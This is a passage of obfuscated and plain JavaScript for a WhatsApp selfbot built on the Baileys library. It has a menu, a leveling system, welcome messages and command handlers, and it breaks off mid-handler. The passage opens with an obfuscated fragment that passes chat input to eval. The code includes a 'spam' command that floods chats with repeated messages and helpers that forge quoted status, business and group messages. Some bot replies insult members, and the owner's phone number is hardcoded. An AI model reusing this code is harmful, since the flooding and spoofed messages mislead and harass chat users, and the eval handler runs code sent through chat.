_0x54c827(_0x22dd3a);}try{_0x54c827(util[_0x271569(0x291)](eval(_0x271569(0x2c6)+_0x46fccd+_0x271569(0x2e0)))),console[_0x271569(0x1d4)]('\x1b[1;37m>','[','\x1b[1;36mEVALL\x1b[1;37m',']',_0x5a6f33,color('>',_0x271569(0x319)),_0x271569(0x238),color(_0x2308e2[_0x271569(0x2a7)]('@')[0x0]),'args\x20:',color(_0x794f7a[_0x271569(0x41c)]));}catch(_0x24f70a){err=String(_0x24f70a),_0x54c827(err);}}else{if(budy!=undefined){}}if(!budy['startsWith']('$'))return;if(!budy[_0x271569(0x201)]('>'))return;}if(_0x59ec0d&&budy!=undefined){}else console['log'](color(_0x271569(0x2fc),_0x271569(0x2c8)),_0x271569(0x2a8),color(_0x953611[_0x271569(0x2a7)]('@')[0x0]));}catch(_0x53fac5){_0x53fac5=String(_0x53fac5),!_0x53fac5[_0x271569(0x42a)](_0x271569(0x2b4))&&(console[_0x271569(0x1d4)](_0x271569(0x3eb),color(_0x53fac5,_0x271569(0x2c8))),console['log'](_0x53fac5));}});}starts();
const { covidworld } = require("./config/covidworld.js")
const { cnn } = require("./config/cnn.js")
const { Gempa } = require("./config/gempa.js");
const { herolist } = require("./config/herolist.js")
const { herodetails } = require("./config/herodetail.js")

//wa connect
const
	{
		WAConnection,
		MessageType,
		Presence,
		MessageOptions,
		Mimetype,
		WALocationMessage,
		WA_MESSAGE_STUB_TYPES,
		WA_DEFAULT_EPHEMERAL,
		ReconnectMode,
		ProxyAgent,
		GroupSettingChange,
		ChatModification,
		waChatKey,
		mentionedJid,
		processTime,
	} = require("@adiwajshing/baileys")
//=================================================//
prefix = '.'
hit_today = []
blocked = []
banChats = false
offline = false
targetpc = '50373488366'
owner = '50373488366'
fake = 'SATANCITO ᵈᵃʳʸ⛥'
numbernye = '0'
waktu = '-'
alasan = '-'
//=================================================//
async function starts() {
	const pato = new WAConnection()
	pato.version = [2, 2119, 6]
	pato.logger.level = 'warn'
	console.log('>', '[',color('INGFO','blue'),']','Menglogin kawan...')
	pato.on('qr', () => {
	console.log(color('[','white'), color('!','red'), color(']','white'), color(' Scan the qr code above'))
	})

	fs.existsSync('./session.json') && pato.loadAuthInfo('./session.json')
	pato.on('connecting', () => {
	console.log(color('> [ INGFO ]', 'white'), color('Connecting...'))
	})
	pato.on('open', () => {
	console.log(color('> [ INGFO ]', 'white'), color('Connected'))
	})
		await pato.connect({timeoutMs: 30*1000})
  fs.writeFileSync('./session.json', JSON.stringify(pato.base64EncodedAuthInfo(), null, '\t'))
//Banned Call
pato.on('CB:action,,call', async json => {
    const callerId = json[2][0][1].from;
    console.log("call dari "+ callerId)
        pato.sendMessage(callerId, "Auto block system, don't call please", MessageType.text)
        await sleep(4000)
        await pato.blockUser(callerId, "add")
})
//Welkom
	pato.on('group-participants-update', async (anu) => {
		if (!welkom.includes(anu.jid)) return
		try {
            num = anu.participants[0]
            const mdata = await pato.groupMetadata(anu.jid)
            try {
                var pp_user = await pato.getProfilePicture(num)
            } catch (e) {
                var pp_user = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
            }
            if (anu.action == 'add') {
                ini_user = pato.contacts[num]
                ini_img = await getBuffer(`http://api.lolhuman.xyz/api/welcomeimage?apikey=${LolHuman}&img=${pp_user}&text=${ini_user.notify}`)
                group_info = await pato.groupMetadata(anu.jid)
                welkam = `Hola ${ini_user.notify}\n◪ Bienvenido UwU a\n├─ ${mdata.subject}\n\n└─ ❏ Numero: ${num.replace('@s.whatsapp.net', '')}\nLee las reglas y comportate y no spam con el bot, gracias UvU\n${ini_user.notify}`
                pato.sendMessage(anu.jid, ini_img, MessageType.image, { caption: welkam })
            }
            if (anu.action == 'remove') {
                ini_user = pato.contacts[num]
                ini_img = await getBuffer(`http://api.lolhuman.xyz/api/welcomeimage?apikey=${LolHuman}&img=${pp_user}&text=${ini_user.notify}`)
                out = `◪ chao ${ini_user.notify}\n◪ se fue de:\n${mdata.subject}\n│\n└─ ❏ Numero: ${num.replace('@s.whatsapp.net', '')}\nPor puto Ojala no vuelva UnU~~`
                pato.sendMessage(anu.jid, ini_img, MessageType.image, { caption: out })
            }
		} catch (e) {
			console.log('Error : %s', color(e, 'red'))
		}
})
	// Chat Update
pato.on('chat-update', async (mek) => {
	try {
        if (!mek.hasNewMessage) return
        mek = mek.messages.all()[0]
		if (!mek.message) return
		if (mek.key && mek.key.remoteJid == 'status@broadcast') return
		global.blocked
		mek.message = (Object.keys(mek.message)[0] === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
        const content = JSON.stringify(mek.message)
		const from = mek.key.remoteJid
		const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
		const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
        const type = Object.keys(mek.message)[0]
        body = (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : ''
		budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.slice(0).trim().split(/ +/).shift().toLowerCase()
		hit_today.push(command)
        const arg = budy.slice(command.length + 1, budy.length)
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const q = args.join(' ')
		//const meNumber = pato.user.jid.split("@")[0]
		const botNumber = pato.user.jid
		const ownerNumber = ['50373488366@s.whatsapp.net'] //Satan owner
//SETTING WeA
		const isGroup = from.endsWith('@g.us')
		const sender = isGroup ? mek.participant : mek.key.remoteJid
		const senderme = mek.participant
		const isOwner = ownerNumber.includes(sender)
		const isMe = botNumber.includes(senderme)
//
		const totalchat = await pato.chats.all()
		const groupMetadata = isGroup ? await pato.groupMetadata(from) : ''
		const groupName = isGroup ? groupMetadata.subject : ''
		const groupId = isGroup ? groupMetadata.jid : ''
		const groupMembers = isGroup ? groupMetadata.participants : ''
		const groupDesc = isGroup ? groupMetadata.desc : ''
		const groupOwner = isGroup ? groupMetadata.owner : ''
		const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
		const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
		const isGroupAdmins = groupAdmins.includes(sender) || false
        const conts = mek.key.fromMe ? pato.user.jid : pato.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? pato.user.name : conts.notify || conts.vname || conts.name || '-'
       
        //MESS
        
		mess = {
			wait: 'Ten paciencia soy lenta TwY',
			success: 'Oki doki ^w^',
			wrongFormat: 'Formato incorrecto, intenta denuevo UwU',
			error: {
				stick: 'No pude convertirlo, perdon T~T',
				Iv: 'Y ese link funciona? U.U'
			},
			only: {
				group: 'Solo en grupos ÙnÚ',
				admin: 'Solo los admins UvU',
				Badmin: 'No soy una admin T-T'
			}
		}
		const isUrl = (url) => {
        return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/, 'gi'))
        }

        const reply = (teks) => {
            pato.sendMessage(from, teks, text, {quoted:mek})
        }

        const sendMess = (hehe, teks) => {
            pato.sendMessage(hehe, teks, text, {sendEphemeral: true})
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? pato.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : pato.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }
        //FAKEH
const fakekontak = (teks) => {
pato.sendMessage(from, teks, MessageType.text, {
quoted: {
key: {
fromMe: false,
 participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {})
 },
message: {
 'contactMessage': {
 'displayName': `Hola ${pushname}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ucapanWaktu},;;;\nFN:${ucapanWaktu},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
}
}
                }
            })
        }


			

        const fakethumb = (teks, yes) => {
            pato.sendMessage(from, teks, image, {thumbnail:fs.readFileSync('./stik/fake.jpeg'),quoted:mek,caption:yes})
        }
        const fakestatus = (teks) => {
            pato.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Holi cosita ^-^${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    },
                    contextInfo: {
                      "forwardingScore": 999, "isForwarded": true
                    }
                }
            })
        }
        const fakegroup = (teks) => {
            pato.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
                        participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {})
                    },
                    message: {
                        "imageMessage": {
                            "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
                            "mimetype": "image/jpeg",
                            "caption": `Holi cosita UwU ${pushname}`,
                            "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
                            "fileLength": "28777",
                            "height": 1080,
                            "width": 1079,
                            "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
                            "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
                            "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
                            "mediaKeyTimestamp": "1610993486",
                            "jpegThumbnail": fs.readFileSync('./stik/thumb.jpeg'),
                            "scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
                        }
                    }
                }
            })
        }
 const faketoko = (teks) => {
 pato.sendMessage(from, teks, text, {
quoted: {
 key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {}) 
}, message: {
'productMessage': {
'product': {
 'productImage':{
'mimetype': 'image/jpeg',
 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')
},
'title': `Hola cosita UwU${pushname}`,
'productImageCount': 9999
},
'businessOwnerJid': `0@s.whatsapp.net`
}
}
                }
            })
        }
const faketokoforwaded = (teks) => {
	anu = {
	  key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": fs.readFileSync(`./stik/thumb.jpeg`)
					},
					"title": `Holi cosita UwU ${pushname}, ${ucapanWaktu}`,
					"retailerId": "Self Bot",
					"productImageCount": 1
				},
				"businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
	pato.sendMessage(from, teks, text, {
	  quoted: anu,
	  contextInfo:{
	    "forwardingScore": 999, "isForwarded": true
	  }
	})
}
        const sendStickerFromUrl = async(to, url) => {
                var names = Date.now() / 10000;
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, './stik' + names + '.png', async function () {
                    console.log('selesai');
                    let filess = './stik' + names + '.png'
                    let asw = './stik' + names + '.webp'
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        let media = fs.readFileSync(asw)
                        pato.sendMessage(to, media, MessageType.sticker,{quoted:mek})
                        fs.unlinkSync(filess)
                        fs.unlinkSync(asw)
                    });
                });
            }
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                if(mids.length > 0){
                    text = normalizeMention(to, text, mids)
                }
                const fn = Date.now() / 10000;
                const filename = fn.toString()
                let mime = ""
                var download = function (uri, filename, callback) {
                    request.head(uri, function (err, res, body) {
                        mime = res.headers['content-type']
                        request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
                    });
                };
                download(url, filename, async function () {
                    console.log('done');
                    let media = fs.readFileSync(filename)
                    let type = mime.split("/")[0]+"Message"
                    if(mime === "image/gif"){
                        type = MessageType.video
                        mime = Mimetype.gif
                    }
                    if(mime.split("/")[0] === "audio"){
                        mime = Mimetype.mp4Audio
                    }
                    pato.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }   
//FUNCTION
            cekafk(afk)
            if (!mek.key.remoteJid.endsWith('@g.us') && offline){
            if (!mek.key.fromMe){
            if (isAfk(mek.key.remoteJid)) return
            addafk(mek.key.remoteJid)
            heheh = ms(Date.now() - waktu) 
            pato.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
            }
            }   
        if (mek.key.remoteJid.endsWith('@g.us') && offline) {
        if (!mek.key.fromMe){
        if (mek.message.extendedTextMessage != undefined){
        if (mek.message.extendedTextMessage.contextInfo != undefined){
        if (mek.message.extendedTextMessage.contextInfo.mentionedJid != undefined){
        for (let ment of mek.message.extendedTextMessage.contextInfo.mentionedJid) {
        if (ment === `${owner}@s.whatsapp.net`){
        if (isAfk(mek.key.remoteJid)) return
        addafk(mek.key.remoteJid)
        heheh = ms(Date.now() - waktu)
        pato.sendMessage(mek.key.remoteJid,`@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`, MessageType.text,{contextInfo:{ mentionedJid: [`${owner}@s.whatsapp.net`],'stanzaId': "B826873620DD5947E683E3ABE663F263", 'participant': "0@s.whatsapp.net", 'remoteJid': 'status@broadcast', 'quotedMessage': {"imageMessage": {"caption": "*OFFLINE*", 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}})
          }
        }
            }
          }
        }
      }
    }
    //> Level <
const getLevelingXp = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].xp
            }
        }

        const jadiUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            user.push(obj)
            fs.writeFileSync('./database/user.json', JSON.stringify(user))
        }
        const bikinSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const getLevelingLevel = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].level
            }
        }

        const getLevelingId = (sender) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                return _level[position].id
            }
        }

        const addLevelingXp = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].xp += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingLevel = (sender, amount) => {
            let position = false
            Object.keys(_level).forEach((i) => {
                if (_level[i].id === sender) {
                    position = i
                }
            })
            if (position !== false) {
                _level[position].level += amount
                fs.writeFileSync('./database/level.json', JSON.stringify(_level))
            }
        }

        const addLevelingId = (sender) => {
            const obj = {id: sender, xp: 1, level: 1}
            _level.push(obj)
            fs.writeFileSync('./database/level.json', JSON.stringify(_level))
        }
			//[-- function level bar --]
			var per = '*[▒▒▒▒▒▒▒▒▒▒] 0%*'
			const peri = 5000 * (Math.pow(2, getLevelingLevel(sender)) - 1)
			const perl = peri-getLevelingXp(sender) 
			const resl = Math.round(100-((perl/getLevelingXp(sender))*100))
			if (resl <= 10) {
				per = `*[█▒▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 20) {
				per = `*[██▒▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 30) {
				per = `*[███▒▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 40) {
				per = `*[████▒▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 50) {
				per = `*[█████▒▒▒▒▒] ${resl}%*`
			} else if (resl <= 60) {
				per = `*[██████▒▒▒▒] ${resl}%*`
			} else if (resl <= 70) {
				per = `*[███████▒▒▒] ${resl}%*`
			} else if (resl <= 80) {
				per = `*[████████▒▒] ${resl}%*`
			} else if (resl <= 90) {
				per = `*[█████████▒] ${resl}%*`
			} else if (resl <= 100) {
				per = `*[██████████] ${resl}%*`
			} 
			/*[-- function rank --]*/
			const levelRole = getLevelingLevel(sender)
   	     var role = 'Noob'
   	     if (levelRole <= 3) {
   	         role = 'Aun noob'
   	     } else if (levelRole <= 5) {
   	         role = 'Soldado'
   	     } else if (levelRole <= 7) {
   	         role = 'Asalto'
   	     } else if (levelRole <= 8) {
   	         role = 'Sargento'
   	     } else if (levelRole <= 9) {
   	         role = 'Sargento II'
   	     } else if (levelRole <= 10) {
   	         role = 'Sargento III'
   	     } else if (levelRole <= 11) {
   	         role = 'Sargento IV'
   	     } else if (levelRole <= 12) {
   	         role = 'Teniente'
   	     } else if (levelRole <= 13) {
   	         role = 'Teniente II'
   	     } else if (levelRole <= 14) {
   	         role = 'Sgt 1st class III'
   	     } else if (levelRole <= 14) {
   	         role = 'Ggt 1st class IV'
   	     } else if (levelRole <= 15) {
   	         role = 'Master sgt I'
   	     } else if (levelRole <= 16) {
   	         role = 'Master sgt II'
   	     } else if (levelRole <= 17) {
   	         role = 'Master sgt III'
   	     } else if (levelRole <= 18) {
   	         role = 'Master sgt IV'
   	     } else if (levelRole <= 19) {
   	         role = 'Master sgt V'
   	     } else if (levelRole <= 20) {
   	         role = '2nd Lt I'
   	     } else if (levelRole <= 21) {
   	         role = '2nd Lt II'
   	     } else if (levelRole <= 22) {
   	         role = '2nd Lt III'
   	     } else if (levelRole <= 23) {
   	         role = '2nd Lt IV'
   	     }
   //Function Level Up
const levelup = (pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role) => {
	fakekontak(`\n*「 FELICIDADES 」*\n┌ *Nombre* : ${pushname}\n├ *Número* : wa.me/${sender.split("@")[0]}\n├  *Xp* : ${getLevelingXp(sender)}\n├ *Rol*: ${role}\n└  *Nivel* : ${getLevel} ⊱ ${getLevelingLevel(sender)}`)
}
//Function Level
            if (isGroup) {
            const currentLevel = getLevelingLevel(sender)
            const checkId = getLevelingId(sender)
            try {
                if (currentLevel === undefined && checkId === undefined) addLevelingId(sender)
                const amountXp = Math.floor(Math.random() * 10) + 500
                const requiredXp = 5000 * (Math.pow(2, currentLevel) - 1)
                const getLevel = getLevelingLevel(sender)
                addLevelingXp(sender, amountXp)
                if (requiredXp <= getLevelingXp(sender)) {
                    addLevelingLevel(sender, 1)
                    await fakestatus(levelup(pushname, sender, getLevelingXp,  getLevel, getLevelingLevel, role))
                }
            } catch (err) {
                console.error(err)
            }
        }
//=====================//      
         // Ucapan Waktu
        const hour_now = moment().format('HH')
        var ucapanWaktu = 'wenas👋'
        if (hour_now >= '03' && hour_now <= '10') {
          ucapanWaktu = 'wenas👋'
        } else if (hour_now >= '10' && hour_now <= '14') {
          ucapanWaktu = 'wenas👋'
        } else if (hour_now >= '14' && hour_now <= '17') {
          ucapanWaktu = 'wenas👋'
        } else if (hour_now >= '17' && hour_now <= '18') {
          ucapanWaktu = 'wenas👋'
        } else if (hour_now >= '18' && hour_now <= '23') {
          ucapanWaktu = 'wenas🌚'
        } else {
          ucapanWaktu = 'wenas🌚'
        }
//========================================================================================================================//
		colors = ['blue']
		const isMedia = (type === 'imageMessage' || type === 'videoMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
      	if (!isGroup && isCmd) console.log('\x1b[1;37m>', '[ \x1b[1;36mEXECC\x1b[1;37m ]', time, color(command), 'from', color(sender.split('@')[0]))
     	if (isCmd && isGroup) console.log('\x1b[1;37m>', '[ \x1b[1;36mEXECC\x1b[1;37m ]', time, color(command), 'from', color(sender.split('@')[0]), 'in', color(groupName))
//selfmode
		if (!mek.key.fromMe && banChats === true) return
//botna
switch (command) {
  case prefix+ 'menu':
  case prefix+ 'help':
  case prefix+ '?':
    let i = []
    let giid = []
    for (mem of totalchat){
      i.push(mem.jid)
    }
    for (id of i){
      if (id && id.includes('g.us')){
        giid.push(id)
      }
    }
    let timestampi = speed();
    let sepid = speed() - timestampi
    var { device_manufacturer, device_model, mcc, mnc, os_version, os_build_number, wa_version  } = pato.user.phone
    anu = process.uptime()
    runtem = `${kyun(anu)}`
//
    var menu = `  
                SATANCITO ᵈᵃʳʸ⛥
    
Blackpink  -  How you like that 
01:52 ━━━●───── 03:08
     ⇆ㅤㅤ ◁ㅤ ❚❚ㅤ ▷ㅤ ㅤ↻﻿
                  ılıılıılıılıılıılı
ᴠᴏʟᴜᴍᴇ : ▮▮▮▮▮▮▮▯▯▯ 

- *Hits de hoy : ${hit_today.length}*
- *Celular :* ${device_manufacturer}
- *Modelo :* ${device_model}
- *RAM :* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
- *Android :* ${os_version}
- *Versión de WhatsApp* : ${wa_version}
-  *Grupos :* ${giid.length}
- *Chats :* ${totalchat.length - giid.length}
- *Total de chat :* ${totalchat.length}
- *Velocidad :* ${sepid.toFixed(4)} Second
- *Mi tiempo vivo:* ${runtem}
- Prefix : 「 ${prefix} 」

Grupo oficial : https://chat.whatsapp.com/J72bXsh3gRxKufBl8iikDO

╭─Comandos UwU 
├ *${prefix}off*
├ *${prefix}on*
├ *${prefix}status*
├ *${prefix}self*
├ *${prefix}public*
├ *${prefix}peson*
├ *${prefix}pesoff*
├ *${prefix}spam*
├ *${prefix}mute*
├ *${prefix}unmute*
├ *${prefix}delete*
├ *${prefix}setfake*
├ *${prefix}welcome 1/0*
├ *${prefix}setfakeimg*
├ *${prefix}setprefix*
├ *${prefix}setthumb*
├ *${prefix}settarget*
├ *${prefix}covidindo*
├ *${prefix}covidworld*
├ *${prefix}cnn*
├ *${prefix}infogempa*
├ *${prefix}get* [ google.com ]
├ *${prefix}revip* [ 8.8.8.8 ]
├ *${prefix}avatar*
├ *${prefix}loli*
├ *${prefix}waifu*
├ *${prefix}husbu*
├ *${prefix}image* [ random ]
├ *${prefix}pinterest* [ random ]
├ *${prefix}anime* [ random ]
├ *${prefix}wallpaperanime*
├ *${prefix}nsfwavatar* 
├ *${prefix}nekopoi*  
├ *${prefix}hentai* 
├ *${prefix}sticker* [ image > sticker]
├ *${prefix}swm* [ author|packname ]
├ *${prefix}take* [ author|packname ]
├ *${prefix}fdeface*
├ *${prefix}emoji*
├ *${prefix}attp*
├ *${prefix}toimg* [ sticker > image ]
├ *${prefix}tovid* [ sticker > video]
├ *${prefix}tomp3* [ sticker > mp3]
├ *${prefix}slow* [ video > slow ]
├ *${prefix}fast* [ video > fast ]
├ *${prefix}reverse* [ video > reverse ]
├ *${prefix}tourl* [ image > url]
├ *${prefix}upswteks*
├ *${prefix}upswimage*
├ *${prefix}upswvideo*
├ *${prefix}herolist*
├ *${prefix}herodetail* [ Barats ]
├ *${prefix}igstalk* [username]
├ *${prefix}ig* [ link ] 
├ *${prefix}play* [ query ] 
├ *${prefix}video* [ query ] 
├ *${prefix}ytmp3* [ link ] 
├ *${prefix}ytmp4* [ link ] 
├ *${prefix}ytsearch* [ query ] 
├ *${prefix}twitter* [ link ] 
├ *${prefix}tiktok* [ link ] 
├ *${prefix}tiktokaudio* [ link ] 
├ *${prefix}fb* [ link ] 
├ *${prefix}tiktokaudio* [ query ] 
├ *${prefix}brainly* [ query ] 
├ *${prefix}add* [ 503xxxx ]
├ *${prefix}kick* [ tag ]
├ *${prefix}promote* [ tag member ]
├ *${prefix}demote* [ tag admin ]
├ *${prefix}kontak* [ 628xx|aku ]
├ *${prefix}hidetag* [ your message ]
├ *${prefix}sticktag* [ sticker > tag ]
├ *${prefix}giftag* [ gif > tag ]
├ *${prefix}doctag* [ document > tag ]
├ *${prefix}kontag* [ 687xx|aku > tag ]
├ *${prefix}totag* [ media > tag ]
├ *${prefix}ping*
├ *${prefix}term* [ code ]
├ *${prefix}runtime*
├ *${prefix}speed*
╰─ SATANCITO ᵈᵃʳʸ⛥ 
√Eli.Hopeˢᵃᵗᵃⁿ💞
√Satancitoᵈᵃʳʸ💞
√Daricitaˢᵃᵗᵃⁿ💖
√Mr.Patitoᵉᵛᵒˡᵉᵗ🦆
√Felixcitoᵇʳⁱ🌚
`
        	faketokoforwaded(menu)
           	break
    case prefix+ 'on':
            if (!mek.key.fromMe) return 
            offline = false
            fakestatus('En linea :D')
            break       
    case prefix+ 'off':
            if (!mek.key.fromMe) return 
            offline = true
            waktu = Date.now()
            anuu = args.join(' ') ? args.join(' ') : '-'
            alasan = anuu
            fakestatus(' Apagado UvU ')
            break
    case prefix+ 'status':
            fakestatus(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}\n${banChats ? '> SELF-MODE' : '> PUBLIC-MODE'}`)
            break
	case prefix+ 'self':
          	if (!mek.key.fromMe) return fakestatus('No eres mi dueño UnU')
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	fakestatus(`「 *Privado UwU* 」`)
          	break
 //Set Owner For gc
    case prefix+ 'public':
          	if (!mek.key.fromMe) return fakestatus('No eres mi dueño UnU')
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	fakestatus(`「 *PUBLICO OwO* 」`)
          	break
					case prefix+ 'peson':
					  pato.toggleDisappearingMessages(from, WA_DEFAULT_EPHEMERAL)
					  break
					  case prefix+ 'pesoff':
					    pato.toggleDisappearingMessages(from, 0)
					    break
            case prefix+ 'spam':
                if (!isMe) return reply('No eres mi dueño UnU')
                if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlahspam`)
                argz = arg.split("|")
                if (!argz) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
                if (isNaN(argz[1])) return reply(`harus berupa angka`)
                for (let i = 0; i < argz[1]; i++){
                pato.sendMessage(from, argz[0], MessageType.text, {sendEphemeral: true})
                }
	        break
             case prefix+ 'mute':
                if (!isMe) return reply('No eres mi dueño UnU')
                pato.modifyChat(from, ChatModification.mute, 24*60*60*1000)
                reply('*Muteados putos ÙwÚ*')
                console.log('succes mute chat = ' + from)
                break
            case prefix+ 'unmute':
                if (!isMe) return reply('No eres mi dueño UnU')
                pato.modifyChat(from, ChatModification.unmute)
                reply('*Ya puedo ver sus webadas UnU*')
                console.log('succes unmute chat = ' + from)
                break
            case prefix+ 'delete':
                if (!isMe) return reply('No eres mi dueño UnU')
                reply('*Chats borrados 7n7*')
                console.log('succes delete chat = ' + from)
                pato.modifyChat(from, ChatModification.delete)
                break
	case prefix+ 'setreply':
	case prefix+ 'setfake':
	  if (isMe) return('Especialmente hermano, ¿quién eres??')
			if (!q) return fakegroup(mess.wrongFormat)
			fake = q
			fakegroup(`Succes Mengganti Conversation Fake : ${q}`)
			break
	case prefix+ 'setfakeimg':
	  if (isMe) return('No eres mi dueño UnU?')
        	if ((isMedia && !mek.message.videoMessage || isQuotedImage || isQuotedSticker) && args.length == 0) {
